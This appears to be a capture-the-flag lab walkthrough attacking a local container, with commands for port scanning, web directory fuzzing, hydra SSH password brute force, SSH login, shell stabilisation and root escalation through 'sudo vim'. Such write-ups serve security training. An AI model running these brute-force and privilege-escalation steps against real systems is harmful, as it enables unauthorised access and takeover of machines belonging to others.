![image](https://github.com/user-attachments/assets/413f0b5c-bcdf-4358-98d2-3c4943b82913)
```bash
ping -c 1 172.19.0.2
```
![Pasted image 20250114112725](https://github.com/user-attachments/assets/ce50f608-a630-4357-afbc-78f8058f501a)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allports
```
![Pasted image 20250114113606](https://github.com/user-attachments/assets/06118757-5dbc-486a-898a-f8838dc5d5d8)

```bash
nmap -sCV -pPORT,PORT IP -oN targeted
```
![Pasted image 20250114113800](https://github.com/user-attachments/assets/467e4d4e-35b6-4b55-b4a9-3ce580a31b40)

## **Fuzzing web**
```bash
gobuster dir -u http://172.19.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```
![Pasted image 20250114115113](https://github.com/user-attachments/assets/c80ec477-2d7b-4d29-9c62-f66342ded289)
![Pasted image 20250114115206](https://github.com/user-attachments/assets/318bc77b-7532-48b7-b75a-f9eff21fd76b)

## **We have a user, now we will attack the other port**

![Pasted image 20250114115309 1](https://github.com/user-attachments/assets/f70ab6f6-3219-4e15-924e-7a015c8ba38d)

## **We apply brute force**
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 -t 4
```
![Pasted image 20250114120127](https://github.com/user-attachments/assets/e619cffa-712c-458e-a069-a20d5decef1a)

```bash
ssh mario@172.19.0.2
```
![Pasted image 20250114120314](https://github.com/user-attachments/assets/d5d0614e-5d0a-4901-8a48-1c2fd2069127)

## **now we will make a treatment of the TTY**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
![Pasted image 20250114120539](https://github.com/user-attachments/assets/5858820d-d139-4475-9490-f55720a39edf)

## **we make an escalation of privileges**
```bash
sudo -l
```
![Pasted image 20250114120721](https://github.com/user-attachments/assets/110f976f-2983-4602-970f-ea027501ff41)
![Pasted image 20250114121035](https://github.com/user-attachments/assets/2955c20d-e772-4ccc-b08d-2c2f0b7b403c)

```bash
sudo vim -c ':!/bin/sh'
```
![Pasted image 20250114121054](https://github.com/user-attachments/assets/7e2658f0-c9bc-460e-894f-22d2c58e5c66)


